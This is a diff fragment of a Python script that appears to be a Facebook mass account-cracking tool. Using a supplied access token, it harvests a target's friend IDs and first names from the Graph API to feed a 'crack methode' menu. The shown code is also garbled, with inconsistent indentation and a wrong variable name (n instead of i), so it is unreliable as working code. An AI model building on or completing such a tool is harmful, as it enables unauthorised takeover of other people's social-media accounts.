@@ -253,12 +253,12 @@ def massal():
 	idt = raw_input("\033[1;93m➤\033[1;97m Target Id     : ")
 	try:
 	         for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
-				uid = i["id"]
-				nama = n["name"].rsplit(" ")[0]
-				id.append(uid+"<=>"+nama)
-		except KeyError:
-			print("\033[1;93m➤\033[1;97m  Ids friend list Is not public")
-	print("\033[1;93m➤\033[1;97m Total id  : \033[0;92m%s\033[0;96m"%(len(id)))
+		           uid = i["id"]
+			   nama = n["name"].rsplit(" ")[0]
+			   id.append(uid+"<=>"+nama)
+	 except KeyError:
+                 exit("URL Error")
+	 print("\033[1;93m➤\033[1;97m Total id  : \033[0;92m%s\033[0;96m"%(len(id)))
 
 def method():
 	print("\033[1;93m➤\033[1;97m Choose crack methode [ \033[1;92mRecommended B-API \033[1;97m]")
